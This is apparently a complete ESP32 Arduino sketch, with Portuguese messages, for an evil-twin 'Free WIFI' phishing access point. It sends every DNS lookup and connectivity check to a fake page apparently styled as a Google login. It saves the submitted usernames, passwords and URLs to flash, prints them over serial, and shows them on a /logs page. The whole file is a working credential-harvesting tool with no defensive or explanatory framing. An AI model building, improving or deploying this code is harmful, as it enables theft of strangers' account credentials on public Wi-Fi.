#include <WiFi.h>
#include <DNSServer.h>
#include <FS.h>
#include <SPIFFS.h>
#include <WebServer.h>
#include "google.h"

#define captivePortalPage GOOGLE_HTML
#define LOGFILE "/log.txt"

String webString="";
String serialString="";


const char *ssid = "Free WIFI";

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;

WebServer webServer(80);


void setup() {
  
  pinMode(13, OUTPUT);

  Serial.begin(9600);
  Serial.println();
  Serial.println("Fake Portal ESP32");
  Serial.println();
  
  
  Serial.print("Inicializando sitema de arquivos, a primeira vez pode levar alguns minutos...");
  SPIFFS.begin();
  Serial.println(" [OK!]");
  Serial.print("Buscando pelo aquivo log.txt...");
  
  File f = SPIFFS.open(LOGFILE, "r");
  
  if (!f) {
    Serial.print(" Arquivo ainda não existe. \nFormatando e criando arquivo...");
    SPIFFS.format();
    
    File f = SPIFFS.open(LOGFILE, "w");
    if (!f) {
      Serial.println("Criação do arquivo falhou!");
    }
    f.println("Credenciais capturadas:");
  }
  f.close();
  Serial.println(" [OK!]");

  
  Serial.print("Iniciando AP...");
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid);
  delay(500);
  Serial.println(" [OK!]");

 
  Serial.print("Iniciando Servidor DNS...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("[OK!]");

  
  webServer.on("/", handleRoot);
  webServer.on("/generate_204", handleRoot);  
  webServer.on("/fwlink", handleRoot);  
  webServer.onNotFound(handleRoot);

  
  webServer.on("/validate", []() {
   
    String url = webServer.arg("url");
    String user = webServer.arg("user");
    String pass = webServer.arg("pass");

    
    serialString = user+":"+pass;
    Serial.println(serialString);

   
    File f = SPIFFS.open(LOGFILE, "a");
    f.print(url);
    f.print(":");
    f.print(user);
    f.print(":");
    f.println(pass);
    f.close();
    
   
    webString = "<h1>Conectado!</h1>";
    webServer.send(500, "text/html", webString);
    
    digitalWrite(13, HIGH);
    delay(500);
    digitalWrite(13, LOW);

    
    serialString="";
    webString="";

    
    digitalWrite(13, HIGH);
    delay(500);
    digitalWrite(13, LOW);
  
  });

 
  webServer.on("/logs", [](){
    webString="<html><body><h1>Logins Capturados</h1><br><pre>";
    File f = SPIFFS.open(LOGFILE, "r");
    serialString = f.readString();
    webString += serialString;
    f.close();
    webString += "</pre><br><a href='/logs/clear'>Limpar todo log</a></body></html>";
    webServer.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString="";
    webString="";
  });

  
  webServer.on("/logs/clear", [](){
    webString="<html><body><h1>O log foi limpo</h1><br><a href=\"/esportal\"><- VOLTAR PARA INDEX</a></body></html>";
    File f = SPIFFS.open(LOGFILE, "w");
    f.println("Credenciais capturadas:");
    f.close();
    webServer.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString="";
    webString="";
  });
  

  Serial.print("Iniciando servidor WEB...");
  webServer.begin();
  Serial.println(" [OK!]");
  
  Serial.println("Dispositivo Pronto!");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot() {
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");

  webServer.send(200, "text/html", captivePortalPage);
}
